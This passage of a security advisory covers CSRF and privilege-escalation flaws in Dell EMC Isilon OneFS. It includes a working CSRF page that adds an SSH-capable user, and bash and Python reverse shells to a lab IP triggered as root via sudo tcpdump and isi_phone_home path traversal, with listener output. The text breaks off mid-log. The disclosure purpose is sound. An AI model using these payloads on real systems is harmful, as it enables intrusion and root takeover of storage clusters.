3. **Vulnerability Description**

Dell EMC's website states that:[1]

The EMC Isilon scale-out NAS storage platform combines modular hardware
with unified software to harness unstructured data. Powered by the OneFS
operating system, an EMC Isilon cluster delivers a scalable pool of
storage with a global namespace.

The platform's unified software provides centralized Web-based and
command-line administration to manage the following features:

- A cluster that runs a distributed file system

- Scale-out nodes that add capacity and performance

- Storage options that manage files and tiering

- Flexible data protection and high availability

- Software modules that control costs and optimize resources

Multiple vulnerabilities were found in the Isilon OneFS Web console that
would allow a remote attacker to gain command execution as root.

4. **Vulnerable Packages**

6. **Credits**

These vulnerabilities were discovered and researched by Ivan Huertas and
Maximiliano Vidal from Core Security Consulting Services. The
publication of this advisory was coordinated by Alberto Solino from Core
Advisories Team.

7. **Technical Description / Proof of Concept Code**

The Web console contains several sensitive features that are vulnerable
to cross-site request forgery. We describe this issue in section 7.1.

Sections 7.2 and 7.3 show two vectors to escalate privileges to root.

Various persistent cross-site scripting issues are presented in the
remaining sections (7.4, 7.5, 7.6, 7.7, 7.8, 7.9).

7.1. **Cross-site request forgery leading to command execution**

[CVE-2018-1213]
There are no anti-CSRF tokens in any forms on the Web interface.
This would allow an attacker to submit authenticated requests when an
authenticated user browses an attacker-controlled domain.

The Web console contains a plethora of sensitive actions that can be
abused, such as adding new users with SSH access or re-mapping existing
storage directories to allow read-write-execute access to all users.

All requests are JSON-encoded, which in some cases might hinder
exploitation of CSRF vulnerabilities. However, the application does not
verify the content-type set. This allows an attacker to exploit the CSRF
vulnerabilities by setting a text/plain content-type and sending the
request body as JSON_PAYLOAD=ignored.

The following proof of concept creates a new user and assigns him a new
role with enough privileges to log in via SSH, configure identifies,
manage authentication providers, configure the cluster and run the
remote support tools.

/-----
<html>
  <body>
    <form id="addUser" target="_blank"
action="https://192.168.1.11:8080/platform/1/auth/users?query_member_of=true&resolve_names=true&start=0&zone=System&provider=lsa-local-provider%3ASystem"

value="" />
    </form>
    <form id="addRole" target="_blank"
action="https://192.168.1.11:8080/platform/1/auth/roles" method="POST"
enctype="text/plain">
      <input type="hidden"
name="{"members":[{"name":"pepito","type":"user"}],"name":"pepito_role","privileges":[{"id":"ISI_PRIV_AUTH","name":"Auth","read_only":false},{"id":"ISI_PRIV_CLUSTER","name":"Cluster","read_only":false},{"id":"ISI_PRIV_REMOTE_SUPPORT","name":"Remote
Support","read_only":false},{"id":"ISI_PRIV_LOGIN_SSH","name":"SSH","read_only":true}]}"
value="" />
    </form>
    <script>
      document.getElementById("addUser").submit();
      window.setTimeout(function() {
document.getElementById("addRole").submit() }, 1000);
    </script>
  </body>
</html>
-----/

7.2. **Privilege escalation due to incorrect sudo permissions**

[CVE-2018-1203]
The compadmin user can run the tcpdump binary with root privileges via
sudo. This allows for local privilege escalation, as tcpdump can be
instructed to run shell commands when rotating capture files.

/-----
pepe-1$ id
uid=11(compadmin) gid=0(wheel) groups=0(wheel),1(daemon)
pepe-1$ cat /tmp/lala.sh
#!/bin/bash

bash -i >& /dev/tcp/192.168.1.66/8888 0>&1
-----/

Once the desired shell script is in place, the attacker can run tcpdump
as follows to trigger the execution:

/-----
pepe-1$ sudo tcpdump -i em0 -G 1 -z /tmp/lala.sh -w dump
tcpdump: WARNING: unable to contact casperd
tcpdump: listening on em0, link-type EN10MB (Ethernet), capture size
65535 bytes
/tmp/lala.sh: connect: Connection refused
/tmp/lala.sh: line 3: /dev/tcp/192.168.1.66/8888: Connection refused
/tmp/lala.sh: connect: Connection refused
/tmp/lala.sh: line 3: /dev/tcp/192.168.1.66/8888: Connection refused
-----/

As can be seen below, the script runs with root privileges:

/-----
$ nc -lvp 8888
Listening on [0.0.0.0] (family 0, port 8888)
Connection from [192.168.1.11] port 8888 [tcp/*] accepted (family 2,
sport 57692)
bash: no job control in this shell
[root@pepe-1 /compadmin]# id
uid=0(root) gid=0(wheel)
groups=0(wheel),5(operator),10(admin),20(staff),70(ifs)
-----/

7.3. **Privilege escalation via remote support scripts**

[CVE-2018-1204]
From the documentation:

"OneFS allows remote support through EMC Secure Remote Services (ESRS)
which monitors your EMC Isilon cluster, and with your permission, allows
remote access to Isilon Technical Support personnel to gather cluster
data and troubleshoot issues."

"After you enable remote support through ESRS, Isilon Technical Support
personnel can request logs with scripts that gather EMC Isilon cluster
data and then upload the data.
The remote support scripts based on the Isilon isi_gather_info
log-gathering tool are located in the /ifs/data/Isilon_Support/
directory on each node."

"Additionally, isi_phone_home, a tool that focuses on cluster- and
node-specific data, is enabled once you enable ESRS. This tool is
pre-set to send information about your cluster to Isilon Technical
Support on a weekly basis. You can disable or enable isi_phone_home from
 the OneFS command-line interface."

As a cluster administrator or compadmin, it is possible to enable the
remote support functionality, hence enabling the isi_phone_home tool via
sudo. This tool is vulnerable to a path traversal when reading the
script file to run, which would enable an attacker to execute arbitrary
python code with root privileges.

If remote support is not enabled, an attacker could perform the
following operations in order to enable it:

/-----
pepe-1$ sudo isi network subnets create 1 ipv4 1
pepe-1$ sudo isi network pools create 1.0
pepe-1$ sudo isi remotesupport connectemc modify --enabled=yes
--primary-esrs-gateway=10.10.10.10 --use-smtp-failover=no
--gateway-access-pools=1.0
-----/

The isi_phone_home tool is supposed to run scripts located in the
root-only writable directory /usr/local/isi_phone_home/script.
However, the provided script name is used to construct the file path
without sanitization, allowing an attacker to reference other locations.

/-----
def run_script(script_file_name):
    script_path = CFG.get('SCRIPTDIR') + '/' + script_file_name
    if os.path.isfile(script_path):
        cmd = 'python ' + script_path  + ' 2>&1 '
        command_thread = command.Command(cmd)
        exit_code, output =
command_thread.run(int(CFG.get("SCRIPT_TIEMOUT")))
        if exit_code:
            logging.error("Error: {0} running script: {1}
".format(str(exit_code), output))
    else:
        logging.error("File: {0} list_file_name doesn't exist
".format(script_path))
-----/

The final step would be to create a malicious python script on any
writable location and call it via the isi_phone_tool using sudo.
Keep in mind that the previous steps are not required if the system does
already have remote support enabled.

/-----
pepe-1$ cat /tmp/lala.py
#!/usr/bin/env python

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.66",8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

pepe-1$ sudo /usr/bin/isi_phone_home --script-file
../../../../../tmp/lala.py
-----/

/-----
$ nc -lvp 8888
Listening on [0.0.0.0] (family 0, port 8888)
Connection from [192.168.1.11] port 8888 [tcp/*] accepted (family 2,
